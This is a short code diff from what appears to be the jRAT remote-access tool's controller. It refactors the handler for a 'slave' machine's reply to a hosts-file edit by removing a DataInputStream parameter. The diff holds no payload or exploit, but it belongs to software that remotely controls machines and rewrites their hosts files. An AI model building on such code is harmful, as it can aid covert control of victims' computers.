@@ -5,13 +5,12 @@ import jrat.controller.ui.frames.FrameControlPanel;
 import jrat.controller.ui.panels.PanelControlHostsFile;
 
 import javax.swing.*;
-import java.io.DataInputStream;
 
 
 public class Packet39HostEditResult extends AbstractIncomingPacket {
 
 	@Override
-	public void read(Slave slave, DataInputStream dis) throws Exception {
+	public void read(Slave slave) throws Exception {
 		String answer = slave.readLine();
 		FrameControlPanel frame = FrameControlPanel.instances.get(slave);
 		if (frame != null) {
